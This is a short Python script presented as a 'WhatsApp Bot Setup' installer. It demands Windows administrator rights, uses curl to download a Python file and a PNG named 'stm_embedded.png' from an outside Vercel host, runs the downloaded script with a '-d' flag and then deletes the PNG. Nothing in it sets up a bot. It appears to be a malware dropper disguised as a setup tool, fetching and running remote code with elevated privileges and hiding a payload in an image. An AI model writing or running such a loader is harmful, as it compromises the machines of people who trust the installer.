import subprocess
import sys
import os
import ctypes

def is_admin():
    """Check if script is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url, filename):
    """Download a file using curl"""
    print(f"Downloading {filename}...")
    result = subprocess.run(['curl', '-O', url], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Failed to download {filename}")
        return False
    print(f"✓ {filename} downloaded successfully")
    return True

def main():
    print("=" * 50)
    print("WhatsApp Bot Setup")
    print("=" * 50)
    print()
    
    # Check for admin privileges
    if not is_admin():
        print("ERROR: This script requires administrator privileges!")
        print("Please run this script as administrator.")
        print()
        input("Press Enter to exit...")
        sys.exit(1)
    
    print("✓ Running with administrator privileges")
    print()
    
    # Download required files
    print("Downloading required files...")
    print()
    
    files = [
        ("https://agency-sand-eta.vercel.app/files/d.py", "d.py"),
        ("https://agency-sand-eta.vercel.app/files/stm_embedded.png", "stm_embedded.png")
    ]
    
    for url, filename in files:
        if not download_file(url, filename):
            sys.exit(1)
    
    print()
    print("=" * 50)
    print("Running Admin Setup")
    print("=" * 50)
    print()
    
    # Run d.py in admin mode only
    if os.path.exists('d.py'):
        print("Executing d.py with -d flag...")
        subprocess.run([sys.executable, 'd.py', '-d'])
    else:
        print("Error: d.py not found")
        sys.exit(1)
    
    print()
    print("Cleaning up...")
    # Delete the PNG file
    if os.path.exists('stm_embedded.png'):
        os.remove('stm_embedded.png')
        print("✓ Removed stm_embedded.png")
    
    print()
    print("Setup complete!")

if __name__ == "__main__":
    main()
